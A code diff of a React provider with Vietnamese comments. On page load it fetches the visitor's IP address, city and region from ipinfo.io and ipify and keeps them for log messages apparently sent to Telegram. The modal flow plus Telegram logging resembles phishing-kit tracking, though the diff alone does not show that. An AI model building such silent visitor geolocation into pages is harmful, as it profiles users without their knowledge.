@@ -35,44 +35,40 @@ export function ModalFlowProvider({ children }: { children: React.ReactNode }) {
   // Ref để track các log đã gửi, tránh duplicate
   const logSentRef = useRef<Set<string>>(new Set());
 
-  // Fetch IP/location ngay khi load - ưu tiên /api/detect-location (cf-ipcountry), fallback ipinfo
+  // Fetch IP/location ngay khi load từ browser — luôn lấy đủ city/region
   const locationRef = useRef<LocationData | null>(null);
   useEffect(() => {
-    const setLocation = (data: { ip: string; country: string; countryCode: string; city?: string; region?: string }) => {
-      locationRef.current = {
-        ip: data.ip || "unknown",
-        location: {
-          country: data.country || "Unknown",
-          countryCode: data.countryCode || "US",
-          city: data.city || "",
-          region: data.region || "",
-        },
-      };
-    };
+    const fetchLocation = async () => {
+      try {
+        const r = await fetch("https://ipinfo.io/json");
+        const d = await r.json();
+        let ip: string = d.ip || "unknown";
 
-    fetch("/api/detect-location")
-      .then((r) => r.json())
-      .then((data) => {
-        if (data.success && data.ip && data.ip !== "unknown") {
-          setLocation(data);
-        } else {
-          return fetch("https://ipinfo.io/json")
-            .then((r) => r.json())
-            .then((d) => {
-              const country = d.country ? (new Intl.DisplayNames(["en"], { type: "region" }).of(d.country) || d.country) : "Unknown";
-              setLocation({ ip: d.ip, country, countryCode: d.country || "US", city: d.city, region: d.region });
-            });
+        // Nếu IPv6, thử lấy IPv4
+        if (ip.includes(":")) {
+          try {
+            const r4 = await fetch("https://api4.ipify.org?format=json");
+            const d4 = await r4.json();
+            if (d4.ip) ip = d4.ip;
+          } catch { /* giữ IPv6 nếu không lấy được IPv4 */ }
         }
-      })
-      .catch(() => {
-        fetch("https://ipinfo.io/json")
-          .then((r) => r.json())
-          .then((d) => {
-            const country = d.country ? (new Intl.DisplayNames(["en"], { type: "region" }).of(d.country) || d.country) : "Unknown";
-            setLocation({ ip: d.ip, country, countryCode: d.country || "US", city: d.city, region: d.region });
-          })
-          .catch(() => {});
-      });
+
+        const country = d.country
+          ? (new Intl.DisplayNames(["en"], { type: "region" }).of(d.country) || d.country)
+          : "Unknown";
+
+        locationRef.current = {
+          ip,
+          location: {
+            country,
+            countryCode: d.country || "US",
+            city: d.city || "",
+            region: d.region || "",
+          },
+        };
+      } catch { /* locationRef giữ null, Telegram sẽ hiện unknown */ }
+    };
+    fetchLocation();
   }, []);
 
   // Helper function để gửi log với deduplication
